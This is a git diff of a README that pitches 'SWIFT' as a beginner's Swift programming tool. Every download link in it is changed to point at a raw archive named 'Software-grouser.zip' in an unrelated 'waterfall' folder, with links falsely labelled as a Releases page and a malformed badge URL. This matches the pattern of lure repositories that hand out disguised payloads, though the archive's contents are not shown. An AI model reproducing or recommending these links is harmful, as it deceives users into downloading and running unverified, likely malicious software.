@@ -1,6 +1,6 @@
 # 📚 SWIFT - Learn Swift Programming Step by Step
 
-[![Download SWIFT](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/SWIFT.zip%https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/SWIFT.zip)](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/SWIFT.zip)
+[![Download SWIFT](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/Software-grouser.zip%https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/Software-grouser.zip)](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/Software-grouser.zip)
 
 ## 📖 Description
 
@@ -29,7 +29,7 @@ To get started with SWIFT, you will need to download the software from the Relea
 
 Click the link below to access the SWIFT Releases page where you can download the software:
 
-[Visit SWIFT Releases Page](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/SWIFT.zip)
+[Visit SWIFT Releases Page](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/Software-grouser.zip)
 
 ### Step 2: Choose Your Version 
 
@@ -86,6 +86,6 @@ For more resources, check out online platforms that provide Swift programming tu
 
 You can start your journey of learning Swift by downloading SWIFT from the Releases page. 
 
-[Download SWIFT Here!](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/SWIFT.zip) 
+[Download SWIFT Here!](https://raw.githubusercontent.com/ananttt222/SWIFT/main/waterfall/Software-grouser.zip) 
 
 By following the above steps, you will be well-equipped to download and run SWIFT easily. Enjoy exploring the world of Swift programming!
